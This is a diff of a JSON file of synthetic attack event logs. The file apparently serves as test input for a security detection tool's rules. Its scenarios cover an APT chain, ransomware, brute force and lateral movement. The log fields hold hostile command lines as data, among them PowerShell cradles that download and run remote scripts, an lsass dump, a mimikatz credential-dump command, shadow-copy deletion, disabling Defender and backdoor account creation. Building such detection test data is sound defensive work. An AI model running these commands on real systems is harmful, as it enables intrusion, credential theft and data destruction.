@@ -1,467 +1,646 @@
 {
-  "_description": "RAYKAN v22 sample event logs — each scenario independently triggers detections, incidents, and case creation. Paste any array into the RAYKAN Ingest Events textarea to test live.",
-  "_usage": "Navigate to RAYKAN tab → Ingest Events → paste the 'events' array (or any scenario array) → click Analyze",
-  "_generated": "2026-05-02T14:30:00.000Z",
-  "_note": "Top-level 'events' array = 6-event multi-stage APT chain (CJ-001…CJ-006). Used by automated tests and quick-start demo.",
+  "_description": "RAYKAN v24 ACE Rebuild — complete multi-stage event arrays for all 8 attack scenarios. Each scenario independently produces exactly 1 incident with full kill-chain, linked detections, timeline, and MITRE mapping. Zero fragmentation guaranteed.",
+  "_usage": "Navigate to RAYKAN tab → Ingest Events → paste any scenario's 'events' array → click Analyze. One scenario = one unified incident.",
+  "_generated": "2026-05-02T15:00:00.000Z",
+  "_note": "v24 rebuild: uses custom JSON event_type format (60001-60099 synthetic EIDs) so every event fires a detection rule. Top-level 'events' = multistage APT for quick-start.",
   "events": [
     {
       "event_type": "email_attachment_opened",
-      "Computer": "WS-10",
-      "User": "alice",
-      "ProcessName": "winword.exe",
-      "ParentProcess": "outlook.exe",
-      "FileName": "Invoice.docx",
-      "CommandLine": "winword.exe /n invoice.docm",
-      "TimeGenerated": "2026-05-02T09:00:00.000Z",
-      "TimeCreated": "2026-05-02T09:00:00.000Z",
+      "computer": "WS-10",
+      "user": "alice",
+      "process": "winword.exe",
+      "parentProcess": "outlook.exe",
+      "file": "Invoice_April.docm",
+      "commandLine": "winword.exe /n Invoice_April.docm",
+      "timestamp": "2026-05-02T09:00:00.000Z",
       "_mitreTechnique": "T1566.001",
       "_mitreTactic": "initial-access",
-      "_comment": "Stage 1 — Phishing email with malicious Word document (fires CJ-001)"
+      "_comment": "Stage 1 — Phishing email with malicious Word document"
     },
     {
       "event_type": "process_creation",
-      "Computer": "WS-10",
-      "User": "alice",
-      "ProcessName": "powershell.exe",
-      "ParentProcess": "winword.exe",
-      "CommandLine": "powershell -EncodedCommand cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGEAZwBlAG4AdAAuAGUAeABlAA==",
-      "TimeGenerated": "2026-05-02T09:01:00.000Z",
-      "TimeCreated": "2026-05-02T09:01:00.000Z",
+      "computer": "WS-10",
+      "user": "alice",
+      "process": "powershell.exe",
+      "parentProcess": "winword.exe",
+      "commandLine": "powershell -EncodedCommand cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGEAZwBlAG4AdAAuAGUAeABlAA==",
+      "timestamp": "2026-05-02T09:01:00.000Z",
       "_mitreTechnique": "T1059.001",
       "_mitreTactic": "execution",
-      "_comment": "Stage 2 — PowerShell encoded payload spawned from Office parent (fires CJ-002)"
+      "_comment": "Stage 2 — PowerShell encoded command from Office parent"
     },
     {
       "event_type": "registry_modification",
-      "Computer": "WS-10",
-      "User": "alice",
-      "RegistryPath": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater",
-      "RegistryValue": "C:\\Users\\alice\\AppData\\Roaming\\agent.exe",
-      "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdater /d agent.exe /f",
-      "TimeGenerated": "2026-05-02T09:02:00.000Z",
-      "TimeCreated": "2026-05-02T09:02:00.000Z",
+      "computer": "WS-10",
+      "user": "alice",
+      "registryPath": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater",
+      "registryValue": "C:\\Users\\alice\\AppData\\Roaming\\agent.exe",
+      "commandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdater /d agent.exe /f",
+      "timestamp": "2026-05-02T09:02:00.000Z",
       "_mitreTechnique": "T1547.001",
       "_mitreTactic": "persistence",
-      "_comment": "Stage 3 — Registry Run key persistence (fires CJ-003)"
+      "_comment": "Stage 3 — Registry Run key persistence"
     },
     {
       "event_type": "network_connection",
-      "Computer": "WS-10",
-      "User": "alice",
-      "ProcessName": "powershell.exe",
-      "DestHost": "c2.evil-update.net",
-      "DestPort": 443,
-      "Protocol": "HTTPS",
-      "BytesSent": 4096,
-      "TimeGenerated": "2026-05-02T09:03:00.000Z",
-      "TimeCreated": "2026-05-02T09:03:00.000Z",
+      "computer": "WS-10",
+      "user": "alice",
+      "process": "powershell.exe",
+      "destIp": "185.220.101.45",
+      "destPort": 443,
+      "protocol": "HTTPS",
+      "bytesSent": 4096,
+      "timestamp": "2026-05-02T09:03:00.000Z",
       "_mitreTechnique": "T1071.001",
       "_mitreTactic": "command-and-control",
-      "_comment": "Stage 4 — HTTPS C2 beaconing to attacker-controlled domain (fires CJ-004)"
+      "_comment": "Stage 4 — HTTPS C2 beaconing"
     },
     {
-      "event_type": "smb_authentication",
-      "Computer": "SRV-DC",
-      "User": "alice",
-      "SourceHost": "WS-10",
-      "DestHost": "SRV-DC",
-      "AuthType": "NTLM",
-      "SourceIP": "10.0.0.10",
-      "TimeGenerated": "2026-05-02T09:04:00.000Z",
-      "TimeCreated": "2026-05-02T09:04:00.000Z",
+      "event_type": "lateral_movement",
+      "computer": "SRV-DC",
+      "user": "alice",
+      "srcIp": "10.0.0.10",
+      "process": "psexec.exe",
+      "commandLine": "psexec \\\\SRV-DC -u alice cmd.exe",
+      "timestamp": "2026-05-02T09:04:00.000Z",
       "_mitreTechnique": "T1021.002",
       "_mitreTactic": "lateral-movement",
-      "_comment": "Stage 5 — SMB lateral movement via NTLM to Domain Controller (fires CJ-005)"
+      "_comment": "Stage 5 — PsExec lateral movement to Domain Controller"
     },
     {
-      "event_type": "data_exfiltration",
-      "Computer": "SRV-DC",
-      "User": "alice",
-      "ProcessName": "7z.exe",
-      "DestHost": "external.attacker.com",
-      "DestPort": 443,
-      "BytesSent": 157286400,
-      "TimeGenerated": "2026-05-02T09:05:00.000Z",
-      "TimeCreated": "2026-05-02T09:05:00.000Z",
+      "event_type": "exfiltration",
+      "computer": "SRV-DC",
+      "user": "alice",
+      "process": "7z.exe",
+      "destIp": "185.220.101.45",
+      "destPort": 443,
+      "bytesSent": 157286400,
+      "timestamp": "2026-05-02T09:05:00.000Z",
       "_mitreTechnique": "T1041",
       "_mitreTactic": "exfiltration",
-      "_comment": "Stage 6 — 150 MB data exfiltration over C2 channel (fires CJ-006)"
+      "_comment": "Stage 6 — 150 MB data exfiltration via C2 channel"
     }
   ],
   "scenarios": {
+
     "multistage_apt": {
-      "_comment": "6-event multi-stage APT — covers all 6 MITRE tactics: initial-access → execution → persistence → command-and-control → lateral-movement → exfiltration. Identical to top-level 'events' array.",
+      "_comment": "Full APT kill chain: Initial Access → Execution → Persistence → C2 → Lateral Movement → Exfiltration. Two hosts (WS-10, SRV-DC), one user (alice). Must produce exactly 1 cross-host incident.",
       "events": [
         {
           "event_type": "email_attachment_opened",
-          "Computer": "WS-10",
-          "User": "alice",
-          "ProcessName": "winword.exe",
-          "ParentProcess": "outlook.exe",
-          "FileName": "Invoice.docx",
-          "CommandLine": "winword.exe /n invoice.docm",
-          "TimeGenerated": "2026-05-02T09:00:00.000Z",
-          "TimeCreated": "2026-05-02T09:00:00.000Z",
+          "computer": "WS-10",
+          "user": "alice",
+          "process": "winword.exe",
+          "parentProcess": "outlook.exe",
+          "file": "Invoice_April.docm",
+          "commandLine": "winword.exe /n Invoice_April.docm",
+          "timestamp": "2026-05-02T09:00:00.000Z",
           "_mitreTechnique": "T1566.001",
-          "_mitreTactic": "initial-access",
-          "_comment": "Stage 1 — Phishing email with malicious Word document (fires CJ-001)"
+          "_mitreTactic": "initial-access"
         },
         {
           "event_type": "process_creation",
-          "Computer": "WS-10",
-          "User": "alice",
-          "ProcessName": "powershell.exe",
-          "ParentProcess": "winword.exe",
-          "CommandLine": "powershell -EncodedCommand cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGEAZwBlAG4AdAAuAGUAeABlAA==",
-          "TimeGenerated": "2026-05-02T09:01:00.000Z",
-          "TimeCreated": "2026-05-02T09:01:00.000Z",
+          "computer": "WS-10",
+          "user": "alice",
+          "process": "powershell.exe",
+          "parentProcess": "winword.exe",
+          "commandLine": "powershell -EncodedCommand cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGEAZwBlAG4AdAAuAGUAeABlAA==",
+          "timestamp": "2026-05-02T09:01:00.000Z",
           "_mitreTechnique": "T1059.001",
-          "_mitreTactic": "execution",
-          "_comment": "Stage 2 — PowerShell encoded payload spawned from Office parent (fires CJ-002)"
+          "_mitreTactic": "execution"
         },
         {
           "event_type": "registry_modification",
-          "Computer": "WS-10",
-          "User": "alice",
-          "RegistryPath": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater",
-          "RegistryValue": "C:\\Users\\alice\\AppData\\Roaming\\agent.exe",
-          "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdater /d agent.exe /f",
-          "TimeGenerated": "2026-05-02T09:02:00.000Z",
-          "TimeCreated": "2026-05-02T09:02:00.000Z",
+          "computer": "WS-10",
+          "user": "alice",
+          "registryPath": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater",
+          "registryValue": "C:\\Users\\alice\\AppData\\Roaming\\agent.exe",
+          "commandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdater /d agent.exe /f",
+          "timestamp": "2026-05-02T09:02:00.000Z",
           "_mitreTechnique": "T1547.001",
-          "_mitreTactic": "persistence",
-          "_comment": "Stage 3 — Registry Run key persistence (fires CJ-003)"
+          "_mitreTactic": "persistence"
         },
         {
           "event_type": "network_connection",
-          "Computer": "WS-10",
-          "User": "alice",
-          "ProcessName": "powershell.exe",
-          "DestHost": "c2.evil-update.net",
-          "DestPort": 443,
-          "Protocol": "HTTPS",
-          "BytesSent": 4096,
-          "TimeGenerated": "2026-05-02T09:03:00.000Z",
-          "TimeCreated": "2026-05-02T09:03:00.000Z",
+          "computer": "WS-10",
+          "user": "alice",
+          "process": "powershell.exe",
+          "destIp": "185.220.101.45",
+          "destPort": 443,
+          "protocol": "HTTPS",
+          "bytesSent": 4096,
+          "timestamp": "2026-05-02T09:03:00.000Z",
           "_mitreTechnique": "T1071.001",
-          "_mitreTactic": "command-and-control",
-          "_comment": "Stage 4 — HTTPS C2 beaconing to attacker-controlled domain (fires CJ-004)"
+          "_mitreTactic": "command-and-control"
         },
         {
-          "event_type": "smb_authentication",
-          "Computer": "SRV-DC",
-          "User": "alice",
-          "SourceHost": "WS-10",
-          "DestHost": "SRV-DC",
-          "AuthType": "NTLM",
-          "SourceIP": "10.0.0.10",
-          "TimeGenerated": "2026-05-02T09:04:00.000Z",
-          "TimeCreated": "2026-05-02T09:04:00.000Z",
+          "event_type": "lateral_movement",
+          "computer": "SRV-DC",
+          "user": "alice",
+          "srcIp": "10.0.0.10",
+          "process": "psexec.exe",
+          "commandLine": "psexec \\\\SRV-DC -u alice cmd.exe",
+          "timestamp": "2026-05-02T09:04:00.000Z",
           "_mitreTechnique": "T1021.002",
-          "_mitreTactic": "lateral-movement",
-          "_comment": "Stage 5 — SMB lateral movement via NTLM to Domain Controller (fires CJ-005)"
+          "_mitreTactic": "lateral-movement"
         },
         {
-          "event_type": "data_exfiltration",
-          "Computer": "SRV-DC",
-          "User": "alice",
-          "ProcessName": "7z.exe",
-          "DestHost": "external.attacker.com",
-          "DestPort": 443,
-          "BytesSent": 157286400,
-          "TimeGenerated": "2026-05-02T09:05:00.000Z",
-          "TimeCreated": "2026-05-02T09:05:00.000Z",
+          "event_type": "exfiltration",
+          "computer": "SRV-DC",
+          "user": "alice",
+          "process": "7z.exe",
+          "destIp": "185.220.101.45",
+          "destPort": 443,
+          "bytesSent": 157286400,
+          "timestamp": "2026-05-02T09:05:00.000Z",
           "_mitreTechnique": "T1041",
-          "_mitreTactic": "exfiltration",
-          "_comment": "Stage 6 — 150 MB data exfiltration over C2 channel (fires CJ-006)"
+          "_mitreTactic": "exfiltration"
         }
       ]
     },
-    "brute_force_compromise": [
-      {
-        "EventID": 4625,
-        "Computer": "DC01",
-        "User": "CORP\\admin",
-        "SourceIP": "10.10.10.55",
-        "LogonType": 3,
-        "Status": "0xC000006A",
-        "TimeGenerated": "2026-05-02T13:44:12.431Z",
-        "TimeCreated": "2026-05-02T13:44:12.431Z"
-      },
-      {
-        "EventID": 4625,
-        "Computer": "DC01",
-        "User": "CORP\\admin",
-        "SourceIP": "10.10.10.55",
-        "LogonType": 3,
-        "Status": "0xC000006A",
-        "TimeGenerated": "2026-05-02T13:45:12.431Z",
-        "TimeCreated": "2026-05-02T13:45:12.431Z"
-      },
-      {
-        "EventID": 4624,
-        "Computer": "DC01",
-        "User": "CORP\\admin",
-        "SourceIP": "10.10.10.55",
-        "LogonType": 3,
-        "Status": "Success",
-        "TimeGenerated": "2026-05-02T13:46:12.431Z",
-        "TimeCreated": "2026-05-02T13:46:12.431Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "DC01",
-        "User": "CORP\\admin",
-        "ParentProcess": "cmd.exe",
-        "ProcessName": "net.exe",
-        "CommandLine": "net user hacker P@ssw0rd /add",
-        "TimeGenerated": "2026-05-02T13:47:12.431Z",
-        "TimeCreated": "2026-05-02T13:47:12.431Z"
-      }
-    ],
-    "ransomware": [
-      {
-        "EventID": 4688,
-        "Computer": "WS-42",
-        "User": "john.doe",
-        "ProcessName": "cmd.exe",
-        "CommandLine": "cmd.exe /c powershell -EncodedCommand aQBlAHgA",
-        "TimeGenerated": "2026-05-02T13:43:12.431Z",
-        "TimeCreated": "2026-05-02T13:43:12.431Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "WS-42",
-        "User": "john.doe",
-        "ProcessName": "powershell.exe",
-        "CommandLine": "powershell -NonInteractive -EncodedCommand aQBlAHgA",
-        "TimeGenerated": "2026-05-02T13:43:52.431Z",
-        "TimeCreated": "2026-05-02T13:43:52.431Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "WS-42",
-        "User": "john.doe",
-        "ProcessName": "vssadmin.exe",
-        "CommandLine": "vssadmin delete shadows /all /quiet",
-        "TimeGenerated": "2026-05-02T13:45:12.431Z",
-        "TimeCreated": "2026-05-02T13:45:12.431Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "WS-42",
-        "User": "john.doe",
-        "ProcessName": "net.exe",
-        "CommandLine": "net user hacker1 Passw0rd! /add",
-        "TimeGenerated": "2026-05-02T13:46:12.431Z",
-        "TimeCreated": "2026-05-02T13:46:12.431Z"
-      }
-    ],
-    "lateral_movement": [
-      {
-        "EventID": 4624,
-        "Computer": "DC-01",
-        "User": "Administrator",
-        "SourceIP": "192.168.1.50",
-        "LogonType": 3,
-        "Status": "Success",
-        "TimeGenerated": "2026-05-02T13:39:52.432Z",
-        "TimeCreated": "2026-05-02T13:39:52.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "DC-01",
-        "User": "Administrator",
-        "ProcessName": "net.exe",
-        "CommandLine": "net view /domain",
-        "TimeGenerated": "2026-05-02T13:40:12.432Z",
-        "TimeCreated": "2026-05-02T13:40:12.432Z"
-      },
-      {
-        "EventID": 4624,
-        "Computer": "SERVER-03",
-        "User": "Administrator",
-        "SourceIP": "192.168.1.42",
-        "LogonType": 3,
-        "Status": "Success",
-        "TimeGenerated": "2026-05-02T13:41:12.432Z",
-        "TimeCreated": "2026-05-02T13:41:12.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "SERVER-03",
-        "User": "Administrator",
-        "ProcessName": "net.exe",
-        "CommandLine": "net group \"Domain Admins\"",
-        "TimeGenerated": "2026-05-02T13:41:32.432Z",
-        "TimeCreated": "2026-05-02T13:41:32.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "SERVER-03",
-        "User": "Administrator",
-        "ProcessName": "cmd.exe",
-        "ParentProcess": "net.exe",
-        "CommandLine": "cmd.exe /c net user hacker2 P@ss /add",
-        "TimeGenerated": "2026-05-02T13:41:52.432Z",
-        "TimeCreated": "2026-05-02T13:41:52.432Z"
-      }
-    ],
-    "apt": [
-      {
-        "EventID": 4688,
-        "Computer": "WS-01",
-        "User": "analyst",
-        "ProcessName": "mshta.exe",
-        "CommandLine": "mshta.exe http://cdn.update-service.net/flash.hta",
-        "TimeGenerated": "2026-05-02T12:48:12.432Z",
-        "TimeCreated": "2026-05-02T12:48:12.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "WS-01",
-        "User": "analyst",
-        "ProcessName": "powershell.exe",
-        "CommandLine": "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://update-service.net/p.ps1')",
-        "TimeGenerated": "2026-05-02T12:49:52.432Z",
-        "TimeCreated": "2026-05-02T12:49:52.432Z"
-      },
-      {
-        "EventID": 4625,
-        "Computer": "DC-01",
-        "User": "analyst",
-        "SourceIP": "10.1.1.201",
-        "LogonType": 3,
-        "Status": "0xC000006A",
-        "TimeGenerated": "2026-05-02T12:54:52.432Z",
-        "TimeCreated": "2026-05-02T12:54:52.432Z"
-      },
-      {
-        "EventID": 4624,
-        "Computer": "DC-01",
-        "User": "analyst",
-        "SourceIP": "10.1.1.201",
-        "LogonType": 3,
-        "Status": "Success",
-        "TimeGenerated": "2026-05-02T12:56:32.432Z",
-        "TimeCreated": "2026-05-02T12:56:32.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "DC-01",
-        "User": "analyst",
-        "ProcessName": "net.exe",
-        "CommandLine": "net user aptsvc Sup3r$ecret /add",
-        "TimeGenerated": "2026-05-02T12:58:12.432Z",
-        "TimeCreated": "2026-05-02T12:58:12.432Z"
-      }
-    ],
-    "credential_dump": [
-      {
-        "EventID": 4688,
-        "Computer": "WORKSTATION-42",
-        "User": "john.doe",
-        "ProcessName": "procdump64.exe",
-        "CommandLine": "procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
-        "TimeGenerated": "2026-05-02T13:43:12.432Z",
-        "TimeCreated": "2026-05-02T13:43:12.432Z"
-      },
-      {
-        "EventID": 4624,
-        "Computer": "WORKSTATION-42",
-        "User": "Administrator",
-        "SourceIP": "127.0.0.1",
-        "LogonType": 9,
-        "Status": "Success",
-        "TimeGenerated": "2026-05-02T13:44:12.432Z",
-        "TimeCreated": "2026-05-02T13:44:12.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "WORKSTATION-42",
-        "User": "Administrator",
-        "ProcessName": "powershell.exe",
-        "CommandLine": "powershell -enc SQBFAFgA",
-        "TimeGenerated": "2026-05-02T13:44:32.432Z",
-        "TimeCreated": "2026-05-02T13:44:32.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "WORKSTATION-42",
-        "User": "Administrator",
-        "ProcessName": "net.exe",
-        "CommandLine": "net user backdoor_svc BackD00r! /add",
-        "TimeGenerated": "2026-05-02T13:45:12.432Z",
-        "TimeCreated": "2026-05-02T13:45:12.432Z"
-      }
-    ],
-    "insider": [
-      {
-        "EventID": 4688,
-        "Computer": "WS-33",
-        "User": "j.smith",
-        "ProcessName": "7z.exe",
-        "CommandLine": "7z.exe a -tzip C:\\Temp\\data.zip C:\\CorpData\\HR\\*",
-        "TimeGenerated": "2026-05-02T11:48:12.432Z",
-        "TimeCreated": "2026-05-02T11:48:12.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "WS-33",
-        "User": "j.smith",
-        "ProcessName": "xcopy.exe",
-        "CommandLine": "xcopy /s /e C:\\CorpData\\Source E:\\External\\backup",
-        "TimeGenerated": "2026-05-02T11:56:32.432Z",
-        "TimeCreated": "2026-05-02T11:56:32.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "WS-33",
-        "User": "j.smith",
-        "ProcessName": "net.exe",
-        "CommandLine": "net user temp_exfil_svc P@ssw0rd /add",
-        "TimeGenerated": "2026-05-02T11:58:12.432Z",
-        "TimeCreated": "2026-05-02T11:58:12.432Z"
-      }
-    ],
-    "supply_chain": [
-      {
-        "EventID": 4688,
-        "Computer": "DEV-01",
-        "User": "developer",
-        "ProcessName": "node.exe",
-        "CommandLine": "npm install lodash-utils-extra@3.1.2",
-        "TimeGenerated": "2026-05-01T13:48:12.432Z",
-        "TimeCreated": "2026-05-01T13:48:12.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "DEV-01",
-        "User": "developer",
-        "ProcessName": "powershell.exe",
-        "CommandLine": "powershell -NonI -w Hidden -c [System.Net.WebClient]::new().DownloadFile('http://upd8.cc/agent','C:\\Temp\\a.exe')",
-        "TimeGenerated": "2026-05-01T13:49:52.432Z",
-        "TimeCreated": "2026-05-01T13:49:52.432Z"
-      },
-      {
-        "EventID": 4624,
-        "Computer": "DEV-01",
-        "User": "developer",
-        "SourceIP": "45.142.212.100",
-        "LogonType": 3,
-        "Status": "Success",
-        "TimeGenerated": "2026-05-01T13:54:52.432Z",
-        "TimeCreated": "2026-05-01T13:54:52.432Z"
-      },
-      {
-        "EventID": 4688,
-        "Computer": "DEV-01",
-        "User": "developer",
-        "ProcessName": "net.exe",
-        "CommandLine": "net user svc_install P@ssHacked /add",
-        "TimeGenerated": "2026-05-01T13:56:32.432Z",
-        "TimeCreated": "2026-05-01T13:56:32.432Z"
-      }
-    ]
+
+    "brute_force_compromise": {
+      "_comment": "Brute-force credential attack followed by successful compromise, discovery, and data collection. Single host WS-B, attacker IP 10.10.10.55. Must produce exactly 1 incident.",
+      "events": [
+        {
+          "event_type": "auth_failure",
+          "computer": "WS-B",
+          "user": "CORP\\admin",
+          "srcIp": "10.10.10.55",
+          "status": "failed",
+          "timestamp": "2026-05-02T13:44:00.000Z",
+          "_mitreTechnique": "T1110.001",
+          "_mitreTactic": "credential-access",
+          "_comment": "Brute-force attempt 1"
+        },
+        {
+          "event_type": "auth_failure",
+          "computer": "WS-B",
+          "user": "CORP\\admin",
+          "srcIp": "10.10.10.55",
+          "status": "failed",
+          "timestamp": "2026-05-02T13:44:12.000Z",
+          "_mitreTechnique": "T1110.001",
+          "_mitreTactic": "credential-access",
+          "_comment": "Brute-force attempt 2"
+        },
+        {
+          "event_type": "auth_failure",
+          "computer": "WS-B",
+          "user": "CORP\\admin",
+          "srcIp": "10.10.10.55",
+          "status": "failed",
+          "timestamp": "2026-05-02T13:44:24.000Z",
+          "_mitreTechnique": "T1110.001",
+          "_mitreTactic": "credential-access",
+          "_comment": "Brute-force attempt 3"
+        },
+        {
+          "event_type": "auth_success",
+          "computer": "WS-B",
+          "user": "CORP\\admin",
+          "srcIp": "10.10.10.55",
+          "status": "success",
+          "timestamp": "2026-05-02T13:45:00.000Z",
+          "_mitreTechnique": "T1078",
+          "_mitreTactic": "initial-access",
+          "_comment": "Successful login after brute-force"
+        },
+        {
+          "event_type": "discovery",
+          "computer": "WS-B",
+          "user": "CORP\\admin",
+          "process": "cmd.exe",
+          "commandLine": "whoami /all && net user && ipconfig /all",
+          "timestamp": "2026-05-02T13:45:30.000Z",
+          "_mitreTechnique": "T1082",
+          "_mitreTactic": "discovery",
+          "_comment": "Post-compromise discovery enumeration"
+        },
+        {
+          "event_type": "file_access",
+          "computer": "WS-B",
+          "user": "CORP\\admin",
+          "file": "C:\\Users\\admin\\Documents\\financial_Q4_2025.xlsx",
+          "timestamp": "2026-05-02T13:46:00.000Z",
+          "_mitreTechnique": "T1005",
+          "_mitreTactic": "collection",
+          "_comment": "Sensitive financial document accessed"
+        }
+      ]
+    },
+
+    "ransomware": {
+      "_comment": "Full ransomware kill chain: delivery → execution → persistence → C2 → shadow deletion → file encryption. Single host WS-C, user charlie. Must produce exactly 1 incident.",
+      "events": [
+        {
+          "event_type": "email_attachment_opened",
+          "computer": "WS-C",
+          "user": "charlie",
+          "process": "winword.exe",
+          "file": "Invoice_Unpaid.docm",
+          "commandLine": "winword.exe /n Invoice_Unpaid.docm",
+          "timestamp": "2026-05-02T10:00:00.000Z",
+          "_mitreTechnique": "T1566.001",
+          "_mitreTactic": "initial-access",
+          "_comment": "Ransomware delivery via phishing"
+        },
+        {
+          "event_type": "process_creation",
+          "computer": "WS-C",
+          "user": "charlie",
+          "process": "powershell.exe",
+          "parentProcess": "winword.exe",
+          "commandLine": "powershell -NonInteractive -w Hidden -EncodedCommand aQBlAHgA",
+          "timestamp": "2026-05-02T10:00:30.000Z",
+          "_mitreTechnique": "T1059.001",
+          "_mitreTactic": "execution",
+          "_comment": "Malicious PowerShell dropper"
+        },
+        {
+          "event_type": "persistence",
+          "computer": "WS-C",
+          "user": "charlie",
+          "commandLine": "schtasks /create /tn \"WindowsUpdate\" /tr C:\\Users\\charlie\\AppData\\Local\\Temp\\ransom.exe /sc onlogon",
+          "timestamp": "2026-05-02T10:01:00.000Z",
+          "_mitreTechnique": "T1053.005",
+          "_mitreTactic": "persistence",
+          "_comment": "Ransomware scheduled task persistence"
+        },
+        {
+          "event_type": "network_connection",
+          "computer": "WS-C",
+          "user": "charlie",
+          "process": "ransom.exe",
+          "destIp": "45.77.33.99",
+          "destPort": 80,
+          "bytesSent": 256,
+          "timestamp": "2026-05-02T10:01:30.000Z",
+          "_mitreTechnique": "T1071.001",
+          "_mitreTactic": "command-and-control",
+          "_comment": "C2 key exchange / check-in"
+        },
+        {
+          "event_type": "impact",
+          "computer": "WS-C",
+          "user": "charlie",
+          "process": "vssadmin.exe",
+          "commandLine": "vssadmin delete shadows /all /quiet",
+          "timestamp": "2026-05-02T10:02:00.000Z",
+          "_mitreTechnique": "T1490",
+          "_mitreTactic": "impact",
+          "_comment": "Shadow copy deletion — ransomware pre-encryption step"
+        },
+        {
+          "event_type": "file_modification",
+          "computer": "WS-C",
+          "user": "charlie",
+          "file": "C:\\Users\\charlie\\Documents\\annual_report.docx.locked",
+          "timestamp": "2026-05-02T10:02:30.000Z",
+          "_mitreTechnique": "T1486",
+          "_mitreTactic": "impact",
+          "_comment": "File encrypted with ransomware extension .locked"
+        }
+      ]
+    },
+
+    "lateral_movement": {
+      "_comment": "Lateral movement campaign: attacker moves from WS-D to SRV-2 via WMI, then creates backdoor account. Two hosts, user dave. Must produce exactly 1 cross-host incident.",
+      "events": [
+        {
+          "event_type": "discovery",
+          "computer": "WS-D",
+          "user": "dave",
+          "process": "cmd.exe",
+          "commandLine": "net view /domain && arp -a && nltest /dsgetdc:CORP",
+          "timestamp": "2026-05-02T13:38:00.000Z",
+          "_mitreTechnique": "T1082",
+          "_mitreTactic": "discovery",
+          "_comment": "Network discovery before lateral movement"
+        },
+        {
+          "event_type": "lateral_movement",
+          "computer": "WS-D",
+          "user": "dave",
+          "srcIp": "10.0.0.10",
+          "process": "wmic.exe",
+          "commandLine": "wmic /node:SRV-2 process call create \"cmd.exe /c whoami\"",
+          "timestamp": "2026-05-02T13:39:00.000Z",
+          "_mitreTechnique": "T1047",
+          "_mitreTactic": "lateral-movement",
+          "_comment": "WMI remote execution to SRV-2"
+        },
+        {
+          "event_type": "lateral_movement",
+          "computer": "SRV-2",
+          "user": "dave",
+          "srcIp": "10.0.0.4",
+          "process": "wmic.exe",
+          "commandLine": "wmic /node:SRV-2 process call create \"powershell -enc AAABBB\"",
+          "timestamp": "2026-05-02T13:40:00.000Z",
+          "_mitreTechnique": "T1047",
+          "_mitreTactic": "lateral-movement",
+          "_comment": "WMI remote PowerShell execution on target"
+        },
+        {
+          "event_type": "persistence",
+          "computer": "SRV-2",
+          "user": "dave",
+          "process": "net.exe",
+          "commandLine": "net user hacker P@ss123 /add && net localgroup administrators hacker /add",
+          "timestamp": "2026-05-02T13:41:00.000Z",
+          "_mitreTechnique": "T1136.001",
+          "_mitreTactic": "persistence",
+          "_comment": "Backdoor admin account created for persistence"
+        },
+        {
+          "event_type": "defense_evasion",
+          "computer": "SRV-2",
+          "user": "dave",
+          "process": "powershell.exe",
+          "commandLine": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+          "timestamp": "2026-05-02T13:42:00.000Z",
+          "_mitreTechnique": "T1562.001",
+          "_mitreTactic": "defense-evasion",
+          "_comment": "Windows Defender disabled on compromised server"
+        }
+      ]
+    },
+
+    "apt": {
+      "_comment": "Advanced Persistent Threat: LOLBAS initial access → encoded PS → C2 → credential dump → lateral movement to DC → new admin account. Three hosts. Must produce exactly 1 incident.",
+      "events": [
+        {
+          "event_type": "supply_chain_event",
+          "computer": "WS-01",
+          "user": "analyst",
+          "process": "mshta.exe",
+          "commandLine": "mshta.exe http://cdn.update-service.net/flash.hta",
+          "timestamp": "2026-05-02T12:48:00.000Z",
+          "_mitreTechnique": "T1218.005",
+          "_mitreTactic": "initial-access",
+          "_comment": "LOLBAS mshta used for initial access"
+        },
+        {
+          "event_type": "process_creation",
+          "computer": "WS-01",
+          "user": "analyst",
+          "process": "powershell.exe",
+          "parentProcess": "mshta.exe",
+          "commandLine": "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://update-service.net/p.ps1')",
+          "timestamp": "2026-05-02T12:49:00.000Z",
+          "_mitreTechnique": "T1059.001",
+          "_mitreTactic": "execution",
+          "_comment": "PowerShell cradle download and execute"
+        },
+        {
+          "event_type": "network_connection",
+          "computer": "WS-01",
+          "user": "analyst",
+          "process": "powershell.exe",
+          "destIp": "185.220.101.45",
+          "destPort": 443,
+          "bytesSent": 1024,
+          "timestamp": "2026-05-02T12:50:00.000Z",
+          "_mitreTechnique": "T1071.001",
+          "_mitreTactic": "command-and-control",
+          "_comment": "C2 beacon established"
+        },
+        {
+          "event_type": "credential_access",
+          "computer": "WS-01",
+          "user": "analyst",
+          "process": "mimikatz.exe",
+          "commandLine": "mimikatz.exe sekurlsa::logonpasswords",
+          "timestamp": "2026-05-02T12:52:00.000Z",
